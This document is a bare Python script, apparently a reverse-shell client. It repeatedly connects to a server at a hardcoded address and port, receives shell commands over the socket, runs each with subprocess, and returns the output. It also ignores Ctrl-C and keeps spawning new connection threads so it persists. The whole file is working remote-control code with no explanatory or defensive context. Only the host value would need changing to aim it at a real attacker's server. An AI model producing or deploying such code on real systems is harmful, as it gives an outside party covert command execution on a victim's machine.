import time
import socket 
import threading
import subprocess

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5050
BUFFER_SIZE = 1024

def worker():
    # Try to connect
    s = socket.socket()
    while True:
        try:
            s.connect((SERVER_HOST, SERVER_PORT))
            print("Connected!")
            break
        except Exception as e:
            print("Connection Error: " + str(e))
            time.sleep(2)
            continue

    # Welcome message
    message = s.recv(BUFFER_SIZE).decode()
    print("Server:", message)

    # Get new commands
    while True:
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == "exit" or len(command) == 0:
            break

        output = subprocess.getoutput(command)
        s.send(output.encode())

    print("Connection Closed")
    s.close()

if __name__ == '__main__':
    while True:
        try:
            print("Creating new worker...")
            t = threading.Thread(target=worker)
            t.start()
            t.join()
            print("Worker terminated\n")
        except KeyboardInterrupt:
            print("SIGINT received")
            continue